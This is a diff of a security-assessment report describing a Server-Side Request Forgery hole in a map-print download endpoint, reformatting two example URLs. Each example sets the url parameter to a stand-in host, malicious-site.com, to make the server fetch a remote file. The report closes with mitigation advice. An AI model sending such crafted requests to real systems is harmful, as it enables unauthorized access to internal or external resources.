@@ -31,18 +31,14 @@ The assessment of the target application identified a Server-Side Request Forger
    This URL appears to be susceptible to SSRF. By providing a specially crafted `url` parameter, we can attempt to access internal or external resources.
 
    Example:
-   ```
-   .it/maps/api/v1/print/download?url=http://malicious-site.com/malicious-file
-   ```
+   `.it/maps/api/v1/print/download?url=http://malicious-site.com/malicious-file`
 
 2. URL: `.it/maps/api/v1/print/download?url=https%3a%2f%2f.it%2fgeoserver%2fp_bzAdministrativeUnits`
 
    Similar to the previous URL, this one is also vulnerable to SSRF. The provided `url` parameter seems to accept URLs as inputs, which can be manipulated to request arbitrary resources.
 
    Example:
-   ```
-   .it/maps/api/v1/print/download?url=https://malicious-site.com/malicious-file
-   ```
+   `.it/maps/api/v1/print/download?url=https://malicious-site.com/malicious-file`
 
 By using the provided URLs and manipulating the `url` parameter, an attacker could attempt to trigger unintended requests to external or internal resources. This vulnerability could potentially lead to unauthorized data access or other security risks. To mitigate this vulnerability, ensure proper input validation, restrict outgoing requests to trusted domains, and follow best practices for SSRF prevention.
 
